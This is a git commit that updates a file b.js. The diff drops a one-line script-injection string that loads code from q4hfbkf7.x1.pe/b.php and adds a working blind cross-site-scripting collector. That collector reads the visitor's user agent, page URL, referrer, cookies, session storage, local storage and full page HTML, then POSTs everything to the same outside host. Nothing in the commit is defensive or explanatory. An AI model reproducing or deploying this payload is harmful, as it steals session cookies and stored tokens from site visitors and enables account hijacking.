0d5b909013f31607a28a65d6fa73c93779cfec7f
Zeeshan Sahi <zsahi@users.noreply.github.com>
2024-04-16 11:37:54 +0500

    Update b.js

--- b.js
+++ b.js
@@ -1,1 +1,10 @@
-"><script src=https://q4hfbkf7.x1.pe/b.php></script>"@gmail.com
+var mhost = '//q4hfbkf7.x1.pe/b.php';
+var msg = 'User Agent\n' + navigator.userAgent + '\n\nTarget URL\n' + document.URL;
+msg += '\n\nReferer URL\n' + document.referrer + '\n\nReadable Cookies\n' + document.cookie;
+msg += '\n\nSession Storage\n' + JSON.stringify(sessionStorage) + '\n\nLocal Storage\n' + JSON.stringify(localStorage);
+msg += '\n\nFull DOM\n' + document.documentElement.innerHTML;
+
+var r = new XMLHttpRequest();
+r.open('POST', mhost, true);
+r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
